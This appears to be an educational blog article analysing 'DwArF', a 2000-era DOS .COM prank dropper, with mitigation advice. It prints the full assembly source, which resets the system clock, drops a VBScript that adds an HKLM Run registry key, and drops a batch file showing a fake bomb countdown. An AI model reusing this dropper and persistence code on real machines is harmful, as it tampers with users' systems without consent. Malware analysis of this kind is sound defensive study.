# Dissecting the DwArF Virus: A 2000-Era COM Dropper in 16-Bit Assembly 🛠️🔍

> **Disclaimer**: This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

---

## Introduction

In the late 1990s and early 2000s, the internet was a wild frontier—and so was malware. One such relic is **DwArF**, a tiny (~1 KB) 16-bit `.COM` executable written in x86 assembly, authored by "Panda" and dated 2000. Despite its small size, DwArF is a **multi-component dropper** that manipulates system time, creates persistent scripts, and delivers a prank-style payload with dramatic flair.

This virus doesn’t encrypt files or steal data—it **pranks the user** with a fake "bomb" countdown and ASCII explosion. But beneath the joke lies real persistence: it drops a **VBScript** (`c:\dwarf.vbs`) and a **batch file** (`c:\WINDOWS\Panda.bat`), then registers the batch for **autostart via the Windows Registry**.

In this deep dive, we’ll reverse-engineer the full assembly source, analyze its behavior, and explore how even “harmless” malware from two decades ago used sophisticated techniques still seen today: **file droppers, registry persistence, and social engineering**.

---

## Section 1: Overview of the Malware 🦠

### Purpose & Behavior
DwArF is a **non-destructive prank virus** with the following goals:
1. **Set system date** to **December 26, 1999** (Y2K nostalgia?).
2. **Reset system time** to **midnight**.
3. **Drop two files**:
   - `c:\dwarf.vbs` – A VBScript that adds a registry run key.
   - `c:\WINDOWS\Panda.bat` – A batch script that displays a fake bomb countdown and ASCII art explosion.
4. **Display a message** prompting the user to open `dwarf.vbs`.
5. **Achieve persistence** so the prank runs on every boot.

### Infection Vector
Likely spread via:
- Floppy disks
- Email attachments
- Shared network drives
- Early file-sharing platforms

Targets: **Windows 9x/ME** systems (uses `INT 21h`, `COM` format, and direct paths like `c:\WINDOWS\`).

### Known Campaigns
No major outbreaks recorded, but DwArF is a classic example of **"benign" malware** used by script kiddies to scare friends. Its author, **Panda**, was part of the early VX (virus exchange) scene.

---

## Section 2: Source Code Analysis 💻

The malware is written in **16-bit x86 assembly** for the `.COM` format (`org 100h`). It uses **DOS interrupts (`INT 21h`, `INT 10h`)** and direct memory manipulation.

Below is the **fully commented source code**, followed by a section-by-section breakdown.

```nasm
;Par M.Xxxxxxx XXXXXXX (c)2000
;TAILLE : 1034 OCTETS
;DWARF4 MODIFIE LA DATE AU 26 DECEMBRE 1999
;C:\DWARF.VBS QUI AJOUTE UN CLE DANS LA BASE DE REGISTRE
;C:\WINDOWS\DWARF.BAT QUI AFFICHE UN LESSAGE A CHAQUE DEMARRAGE       

.model small
.code
org 100h

DATE:           mov ah,2Bh          ; DOS function: Set system date
                mov dh,12           ; Month = December
                mov dl,26           ; Day = 26
                mov cx,1999         ; Year = 1999
                int 21h             ; Call DOS → Sets date to 26 Dec 1999

HEURE:          mov ah,2Dh          ; DOS function: Set system time
                xor cx,cx           ; Hours:Minutes = 00:00
                xor dx,dx           ; Seconds:Hundredths = 00:00
                int 21h             ; Call DOS → Sets time to 00:00:00

FILE1:          mov ah,3Ch          ; DOS function: Create file
                xor cx,cx           ; Normal attribute
                mov dx,offset NOM1  ; DS:DX = "c:\dwarf.vbs"
                int 21h             ; Create file → AX = handle
                xchg ax,bx          ; BX = handle

                mov ah,40h          ; DOS function: Write to file
                mov cx,progl1       ; Bytes to write (length of prog1)
                mov dx,offset prog1 ; Buffer = VBScript payload
                int 21h             ; Write VBScript to c:\dwarf.vbs

                mov ah,3Eh          ; DOS function: Close file
                int 21h             ; Close handle in BX

FILE2:          mov ah,3Ch
                xor cx,cx
                mov dx,offset NOM2  ; "c:\WINDOWS\Panda.bat"
                int 21h
                xchg ax,bx

                mov ah,40h
                mov cx,progl2       ; Length of batch script
                mov dx,offset prog2 ; Buffer = batch payload
                int 21h

                mov ah,3Eh
                int 21h

MESSAGE:        mov ax,3            ; BIOS: Set video mode 3 (80x25 text)
                int 10h             ; Clear screen
                mov ah,9            ; DOS: Write string to stdout
                lea dx,msg          ; DS:DX = message
                int 21h             ; Display prompt

FIN:            mov ah,4Ch          ; DOS: Terminate program
                int 21h             ; Exit with code 0

; === Data Section ===
NOM1    db 'c:\dwarf.vbs',0
NOM2    db 'c:\WINDOWS\Panda.bat',0

prog1   db 'rem DwArF.vbs by Panda (c)2000',0Dh,0Ah
        db 'msgbox "BONNO JOURNEE ?"',0Dh,0Ah
        db 'Dim W',0Dh,0Ah
        db 'Set W = Wscript.CreateObject("WScript.Shell")',0Dh,0Ah
        db 'W.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows'
        db '\CurrentVersion\Run\DwArF", "C:\WINDOWS\dwarf.bat"'
progl1  equ $-prog1

prog2   db '@echo off',0Dh,0Ah
        db 'if exist c:\dwarf.vbs del c:\dwarf.vbs',0Dh,0Ah
        db 'cls',0Dh,0Ah
        db 'echo.',0Dh,0Ah
        db 'echo UNE BOMBE A ETE PLACE DANS TON ORDINATEUR',0Dh,0Ah
        db 'echo.',0Dh,0Ah
        db 'echo DANS 5 SECONDES TU VAS MOURIR',0Dh,0Ah
        db 'echo.',0Dh,0Ah
        db 'choice /c:Q /t:Q,5 /n Le compte � rebours a commenc�',0Dh,0Ah
        db 'if errorlevel 1 goto Die',0Dh,0Ah
        db ':Die',0Dh,0Ah
        db 'cls',0Dh,0Ah
        db 'echo.',0Dh,0Ah
        db 'echo.',0Dh,0Ah
        db 'echo.',0Dh,0Ah
        db 'echo.',0Dh,0Ah
        db 'echo.',0Dh,0Ah
        db 'echo               ***    ***    ***   *   *',0Dh,0Ah
        db 'echo               *  *  *   *  *   *  ** **',0Dh,0Ah
        db 'echo               *  *  *   *  *   *  * * *',0Dh,0Ah
        db 'echo               * *   *   *  *   *  *   *',0Dh,0Ah
        db 'echo               *  *  *   *  *   *  *   *',0Dh,0Ah
        db 'echo               *  *  *   *  *   *  *   *',0Dh,0Ah
        db 'echo               ***    ***    ***   *   *',0Dh,0Ah
progl2  equ $-prog2

CORBEILLE db 'C:\RECYCLED\*.*',0  ; Unused (possible future payload?)

msg     db 7,7,7,10,13,'UN FICHIER A ETE CREE',0Ah,0Ah,0Dh
        db 'IL SE NOMME C:\dwarf.vbs',10,10,13
        db 'OUVRE LE VITE $'
end DATE
```
---

### Core Functionality Breakdown

| Component | Purpose |
|---------|--------|
| **Date/Time Set** | Forces system clock to **Dec 26, 1999, 00:00**. Possibly to trigger Y2K-related bugs or confuse users. |
| **File Dropper** | Uses `INT 21h, 3Ch/40h/3Eh` to create and write two files. |
| **VBScript (`dwarf.vbs`)** | Uses `WScript.Shell` to write a **registry run key**:<br>`HKLM\...\Run\DwArF → C:\WINDOWS\dwarf.bat` |
| **Batch Script (`Panda.bat`)** | Deletes `dwarf.vbs`, shows fake bomb timer using `choice.com`, then displays ASCII skull. |
| **Social Engineering** | Final message urges user to **open `dwarf.vbs`**, completing the infection chain. |

---

### Evasion & Persistence Techniques

| Technique | Implementation |
|---------|----------------|
| **Small Size** | Only **1034 bytes** — evades size-based detection. |
| **Direct Paths** | Hardcoded `c:\` and `c:\WINDOWS\` — assumes default install. |
| **Registry Persistence** | VBScript adds itself to startup via `RegWrite`. |
| **Self-Cleanup** | Batch deletes VBScript after execution to reduce traces. |

> **Note**: The `CORBEILLE` string (`C:\RECYCLED\*.*`) is defined but **never used** — possibly a remnant of a planned payload to delete recycled files.

---

## Section 3: Mitigation and Defense Strategies 🛡️

Despite its age, DwArF teaches timeless lessons in defense.

### Detection
- **File Monitoring**: Watch for creation of:
  - `c:\dwarf.vbs`
  - `c:\WINDOWS\Panda.bat` or `dwarf.bat`
- **Registry Monitoring**: Alert on writes to:
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DwArF`
- **Behavioral Analysis**:
  - Sudden system date change to 1999
  - Use of `choice.com` + 5-second delay
  - Execution of `.COM` files in modern environments (rare)

### Prevention
| Layer | Recommendation |
|------|----------------|
| **User Education** | Never open unknown `.vbs` or `.bat` files. |
| **Antivirus** | Signature-based detection for `DwArF.COM` (known hash). |
| **Execution Policy** | Disable WSH or restrict script execution via Group Policy. |
| **Sandboxing** | Run untrusted `.COM` files in VM (e.g., DOSBox). |

### For Developers & Admins
- Use **AppLocker** or **Software Restriction Policies** to block `.COM` execution.
- Monitor **registry run keys** with tools like `Autoruns` (Sysinternals).
- Enable **System Restore** and regular backups.

---

## Conclusion

DwArF may be a prank, but it’s a **masterclass in minimalism**. In under 1 KB, it:
- Manipulates system time
- Drops multi-stage payloads
- Achieves persistence
- Uses social engineering

It reminds us that **malware doesn’t need to be complex to be effective**—and that even "joke" viruses can teach us about real threats.

As ransomware and APTs dominate headlines, let’s not forget: **the fundamentals of malware—droppers, persistence, and deception—haven’t changed in 25 years**.

---

## Call to Action 🚀

Stay vigilant. Share this article with your team, your study group, or your retro-computing friends. Malware analysis isn’t just about the latest zero-day—it’s about understanding the **DNA of threats**, from 2000 to 2030.